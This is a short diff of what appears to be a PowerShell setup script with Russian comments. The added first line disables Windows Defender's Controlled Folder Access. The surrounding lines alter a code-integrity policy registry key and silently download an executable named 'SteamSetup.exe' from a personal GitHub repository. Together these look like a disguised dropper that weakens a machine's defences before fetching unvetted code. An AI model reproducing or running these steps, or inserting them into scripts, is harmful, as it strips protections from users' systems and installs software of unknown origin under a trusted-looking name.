@@ -1,3 +1,4 @@
+Set-MpPreference -EnableControlledFolderAccess Disabled
 # Создаём ключ, если его нет
 New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Force | Out-Null
 
@@ -92,6 +93,7 @@ catch {
     Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/SteamSetup.exe" -OutFile "SteamSetup.exe" -ErrorAction SilentlyContinue
     
     
+
 
 
 
